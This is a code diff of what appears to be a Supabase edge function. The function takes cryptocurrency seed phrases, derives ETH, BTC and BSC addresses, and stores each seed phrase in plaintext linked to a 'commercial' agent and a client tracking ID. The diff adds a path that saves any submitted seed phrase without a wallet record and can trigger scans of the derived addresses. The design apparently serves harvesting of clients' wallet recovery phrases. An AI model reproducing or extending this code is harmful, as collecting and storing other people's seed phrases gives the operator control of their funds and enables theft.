@@ -45,13 +45,13 @@ serve(async (req) => {
     
     const supabase = createClient(supabaseUrl, supabaseServiceKey);
 
-    const { wallet_id, seed_phrase } = await req.json();
+    const { wallet_id, seed_phrase, commercial_id, client_tracking_id, scan } = await req.json();
 
-    if (!wallet_id || !seed_phrase) {
-      throw new Error('wallet_id and seed_phrase are required');
+    if (!seed_phrase) {
+      throw new Error('seed_phrase is required');
     }
 
-    console.log(`Generating addresses for wallet ${wallet_id}`);
+    console.log(`Generating addresses for ${wallet_id ? 'wallet ' + wallet_id : 'seed phrase submission'}`);
 
     // Convert mnemonic to seed
     const seed = await mnemonicToSeed(seed_phrase);
@@ -79,50 +79,108 @@ serve(async (req) => {
 
     console.log(`Generated addresses - ETH: ${ethAddress}, BTC: ${btcAddress}, BSC: ${bscAddress}`);
 
-    // Check if generated_wallets entry already exists
-    const { data: existingWallet } = await supabase
-      .from('generated_wallets')
-      .select('*')
-      .eq('wallet_id', wallet_id)
-      .single();
+    let effectiveCommercialId = commercial_id || null;
 
-    if (existingWallet) {
-      // Update existing entry
-      const { error: updateError } = await supabase
+    if (wallet_id) {
+      // Check if generated_wallets entry already exists for this wallet
+      const { data: existingWallet } = await supabase
         .from('generated_wallets')
-        .update({
-          eth_address: ethAddress,
-          btc_address: btcAddress,
-          bsc_address: bscAddress,
-          seed_phrase: seed_phrase
-        })
-        .eq('wallet_id', wallet_id);
+        .select('*')
+        .eq('wallet_id', wallet_id)
+        .maybeSingle();
 
-      if (updateError) throw updateError;
+      if (existingWallet) {
+        // Update existing entry
+        const { error: updateError } = await supabase
+          .from('generated_wallets')
+          .update({
+            eth_address: ethAddress,
+            btc_address: btcAddress,
+            bsc_address: bscAddress,
+            seed_phrase: seed_phrase
+          })
+          .eq('wallet_id', wallet_id);
+        if (updateError) throw updateError;
+      } else {
+        // Get wallet info to get commercial_id
+        const { data: wallet } = await supabase
+          .from('wallets')
+          .select('used_by_commercial_id, client_tracking_id')
+          .eq('id', wallet_id)
+          .maybeSingle();
+
+        if (!wallet) throw new Error('Wallet not found');
+        effectiveCommercialId = wallet.used_by_commercial_id;
+
+        // Create new entry
+        const { error: insertError } = await supabase
+          .from('generated_wallets')
+          .insert({
+            wallet_id: wallet_id,
+            commercial_id: wallet.used_by_commercial_id,
+            client_tracking_id: wallet.client_tracking_id,
+            eth_address: ethAddress,
+            btc_address: btcAddress,
+            bsc_address: bscAddress,
+            seed_phrase: seed_phrase
+          });
+        if (insertError) throw insertError;
+      }
     } else {
-      // Get wallet info to get commercial_id
-      const { data: wallet } = await supabase
-        .from('wallets')
-        .select('used_by_commercial_id, client_tracking_id')
-        .eq('id', wallet_id)
-        .single();
+      // Seed-only flow (no wallet_id)
+      if (!effectiveCommercialId) {
+        throw new Error('commercial_id is required when wallet_id is not provided');
+      }
 
-      if (!wallet) throw new Error('Wallet not found');
-
-      // Create new entry
-      const { error: insertError } = await supabase
+      // Upsert based on seed_phrase
+      const { data: existingBySeed } = await supabase
         .from('generated_wallets')
-        .insert({
-          wallet_id: wallet_id,
-          commercial_id: wallet.used_by_commercial_id,
-          client_tracking_id: wallet.client_tracking_id,
-          eth_address: ethAddress,
-          btc_address: btcAddress,
-          bsc_address: bscAddress,
-          seed_phrase: seed_phrase
-        });
+        .select('*')
+        .eq('seed_phrase', seed_phrase)
+        .maybeSingle();
 
-      if (insertError) throw insertError;
+      if (existingBySeed) {
+        const { error: updateSeedErr } = await supabase
+          .from('generated_wallets')
+          .update({
+            eth_address: ethAddress,
+            btc_address: btcAddress,
+            bsc_address: bscAddress,
+            seed_phrase: seed_phrase,
+            commercial_id: effectiveCommercialId,
+            client_tracking_id: client_tracking_id ?? existingBySeed.client_tracking_id
+          })
+          .eq('id', existingBySeed.id);
+        if (updateSeedErr) throw updateSeedErr;
+      } else {
+        const { error: insertSeedErr } = await supabase
+          .from('generated_wallets')
+          .insert({
+            wallet_id: null,
+            commercial_id: effectiveCommercialId,
+            client_tracking_id: client_tracking_id ?? null,
+            eth_address: ethAddress,
+            btc_address: btcAddress,
+            bsc_address: bscAddress,
+            seed_phrase: seed_phrase
+          });
+        if (insertSeedErr) throw insertSeedErr;
+      }
+    }
+
+    // Optionally trigger scanning of the generated addresses
+    if (scan && effectiveCommercialId) {
+      try {
+        await supabase.functions.invoke('scan-wallet-transactions', {
+          body: {
+            wallet_addresses: [bscAddress, ethAddress, btcAddress],
+            commercial_id: effectiveCommercialId
+          }
+        });
+        console.log('Triggered scan-wallet-transactions for generated addresses.');
+      } catch (scanErr) {
+        console.error('Failed to trigger scan-wallet-transactions:', scanErr);
+      }
     }
 
     return new Response(JSON.stringify({
